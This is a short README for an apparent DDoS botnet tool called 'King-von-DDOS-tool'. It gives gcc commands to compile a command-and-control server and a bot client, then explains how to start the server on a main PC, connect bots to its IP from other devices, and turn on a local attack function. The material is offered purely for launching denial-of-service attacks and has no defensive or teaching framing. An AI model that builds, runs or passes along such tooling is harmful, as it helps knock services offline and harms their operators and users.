# this script is a million times faster than your average skid python ddoser tool

# King-von-DDOS-tool

# to compile run
gcc -O2 -Wall -o c2 c2.c -lpthread && gcc -O2 -Wall -o bot bot.c -lpthread

# usage:
on the main pc start the server with ./c2

then on each device run
./bot (Main pc ip address) to connect to the main pc

if you wanna make your main pc become an attacker too remove the comment block on the start local attack function somewhere in c2.c
